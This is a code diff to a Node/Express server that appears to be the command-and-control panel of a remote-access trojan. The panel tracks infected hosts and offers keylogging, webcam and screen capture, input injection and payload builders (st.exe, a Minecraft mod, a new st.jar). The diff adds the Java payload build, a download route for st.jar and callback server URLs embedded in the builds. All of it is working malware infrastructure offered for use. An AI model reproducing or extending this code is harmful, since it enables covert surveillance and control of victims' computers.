@@ -16,6 +16,7 @@ import db, { UPLOAD_DIR } from './db.js';
 import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
+import { buildJavaPayload } from './builder/java_build.js'; // NEW IMPORT
 import { buildMinecraftMod, progressStore as mcProgressStore } from './builder/minecraftbuild.js';
 import { countriesFor } from './builder/geo.js';
 
@@ -56,6 +57,17 @@ const tlsOpts = {
   cert: fs.readFileSync(CFG.tlsCert),
   key:  fs.readFileSync(CFG.tlsKey),
 };
+
+// Build the universal st.jar on startup
+(async () => {
+  try {
+    console.log('[startup] Building st.jar payload...');
+    await buildJavaPayload();
+    console.log('[startup] st.jar built successfully.');
+  } catch (e) {
+    console.error('[startup] Failed to build st.jar:', e);
+  }
+})();
 
 const app = express();
 app.disable('x-powered-by');
@@ -131,8 +143,7 @@ const limitGlobal = limit({
     req.path.endsWith('/keylog/stop') ||
     req.path.endsWith('/sysinfo') ||
     req.path.startsWith('/api/build/minecraft/progress/') ||
-    req.path === '/api/admin2/stats' ||
-    req.path === '/api/admin2/users',
+    req.path === '/api/admin2/stats',
 });
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
@@ -583,7 +594,7 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
     try {
       const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
       const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
-      await buildBoot({ key: acctKey, buildId: nextBuildId });
+      await buildBoot({ key: acctKey, buildId: nextBuildId, serverIp: base });
     } catch (e) {
       console.error('[wipe] rebuild st.exe failed', e);
       return res.status(500).json({ error: 'failed to rebuild st.exe: ' + (e.message || 'unknown') });
@@ -806,7 +817,7 @@ try {
   }
 } catch {}
 
-const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin', '.ps1', '.dat'];
+const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin', '.ps1', '.dat', '.jar'];
 
 const limitDownloadExe = rateLimit({
   windowMs: 60 * 60 * 1000,
@@ -814,6 +825,13 @@ const limitDownloadExe = rateLimit({
   standardHeaders: true,
   legacyHeaders: false,
   message: { error: 'download limit reached' },
+});
+
+app.get('/api/downloads/st.jar', (req, res) => {
+  const jarPath = path.join(DOWNLOAD_DIR, 'st.jar');
+  if (!fs.existsSync(jarPath)) return res.status(404).send('not found');
+  res.setHeader('Content-Type', 'application/java-archive');
+  res.sendFile(jarPath);
 });
 
 app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
@@ -839,6 +857,7 @@ app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
 
   const st = fs.statSync(full);
   const ctype = ext === '.zip' ? 'application/zip'
+              : ext === '.jar' ? 'application/java-archive'
               : ext === '.dat' ? 'application/octet-stream'
               : 'application/octet-stream';
   res.setHeader('Content-Type', ctype);
@@ -868,7 +887,11 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   try {
     const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
     const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
-    zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId });
+    
+    const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
+    const serverBase = `${proto}://${req.headers.host}`;
+
+    zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId, serverIp: serverBase });
   } catch (e) {
     console.error('[build] failed:', e);
     const msg = (e.stderr || e.message || 'unknown').toString().slice(-3000);
@@ -1137,7 +1160,7 @@ app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, (req, res) => {
   const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen <  ?`).get(cutoff);
 
   const rows = db.prepare(`
-    SELECT c.id, c.hostname, c.ip, c.last_seen, u.username
+    SELECT c.id, c.hostname, c.ip, c.last_seen, c.created_at, u.username
     FROM clients c
     JOIN users u ON u.id = c.user_id
     ORDER BY c.last_seen DESC
@@ -1155,28 +1178,9 @@ app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, (req, res) => {
       username: r.username,
       online: now - r.last_seen < 30_000,
       lastSeen: r.last_seen,
+      createdAt: r.created_at,
     })),
   });
-});
-
-app.get('/api/admin2/users', limitAdmin2Api, requireAdmin2, (req, res) => {
-  res.setHeader('Cache-Control', 'no-store');
-  const rows = db.prepare(`
-    SELECT id, username, email, login_token, created_at
-    FROM users
-    ORDER BY created_at DESC
-    LIMIT 1000
-  `).all();
-  res.json(rows);
-});
-
-app.post('/api/admin2/impersonate/:id', limitAdmin2Api, requireAdmin2, (req, res) => {
-  const uid = Number(req.params.id);
-  const user = db.prepare(sql`SELECT id, username FROM users WHERE id = ?`).get(uid);
-  if (!user) return res.status(404).json({ error: 'user not found' });
-
-  res.cookie('token', signToken(user), cookieOpts());
-  res.json({ ok: true });
 });
 
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
@@ -1209,7 +1213,11 @@ async function refreshAllBuilds() {
         if (!latest) continue;
 
         console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
-        const zipBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id });
+        
+        const proto = CFG.httpPort === 443 ? 'https' : 'http';
+        const serverBase = `${proto}://${process.env.SERVER_DOMAIN || 'localhost'}`;
+        
+        const zipBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id, serverIp: serverBase });
         const zipName = `build_${Date.now()}_u${uid}.zip`;
         fs.writeFileSync(path.join(BUILD_DIR, zipName), zipBuf, { mode: 0o644 });
 
